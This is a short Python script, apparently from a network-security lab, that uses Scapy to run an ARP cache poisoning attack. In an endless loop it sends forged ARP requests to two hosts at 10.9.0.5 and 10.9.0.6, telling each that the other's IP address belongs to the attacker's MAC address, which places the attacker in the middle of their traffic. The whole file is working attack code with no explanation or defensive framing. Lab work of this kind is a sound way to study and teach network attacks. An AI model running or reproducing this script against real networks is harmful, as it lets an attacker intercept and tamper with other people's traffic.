#!/usr/bin/env python3 
from scapy.all import * 
from time import *
ThisMac="02:42:0a:09:00:69" # Mac Address of HostM(attacker)

while True:
    # Poisioning HostA cache <HostB_ip, HostM_MAC>
    ethA = Ether()
    TargetAMac="02:42:0a:09:00:05" 
    ethA.dst = TargetAMac 
    ethA.src = ThisMac 
    arpA = ARP() 
    arpA.op = 1
    FakeIPA='10.9.0.6' 
    TargetIPA='10.9.0.5'
    arpA.psrc = FakeIPA 
    arpA.hwsrc = ThisMac
    arpA.pdst = TargetIPA
    arpA.hwdst = TargetAMac
    pktA = ethA/arpA 
    sendp(pktA)
    ###########################################
    ethB = Ether()
    TargetBMac="02:42:0a:09:00:06"
    ethB.dst = TargetBMac
    ethB.src = ThisMac
    arpB = ARP()
    arpB.op = 1
    FakeIPB='10.9.0.5'
    TargetIPB='10.9.0.6'
    arpB.psrc = FakeIPB
    arpB.hwsrc = ThisMac
    arpB.pdst = TargetIPB
    arpB.hwdst = TargetBMac
    pktB = ethB/arpB
    sendp(pktB)
    sleep(2)
